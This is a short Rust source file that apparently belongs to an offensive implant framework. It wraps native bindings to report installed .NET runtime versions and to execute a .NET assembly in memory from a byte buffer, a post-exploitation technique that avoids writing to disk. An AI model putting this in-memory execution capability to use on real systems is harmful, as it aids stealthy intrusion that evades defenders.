use crate::kit::binding::{CLRVersion, MaleficExecAssembleInMemory};

pub fn display_installed_dotnet_version() -> Vec<String> {
    let s = unsafe { CLRVersion().into_string() };
    if s.is_empty() {
        vec![]
    } else {
        s.split('\n').map(String::from).collect()
    }
}

pub unsafe fn exec_assemble_in_memory(data: &[u8], args: Vec<String>) -> String {
    let c_strings: Vec<_> = args
        .iter()
        .map(|s| std::ffi::CString::new(s.as_str()).unwrap())
        .collect();
    let c_ptrs: Vec<_> = c_strings.iter().map(|s| s.as_ptr() as *const u8).collect();
    MaleficExecAssembleInMemory(data.as_ptr(), data.len(), c_ptrs.as_ptr(), c_ptrs.len())
        .into_string()
}
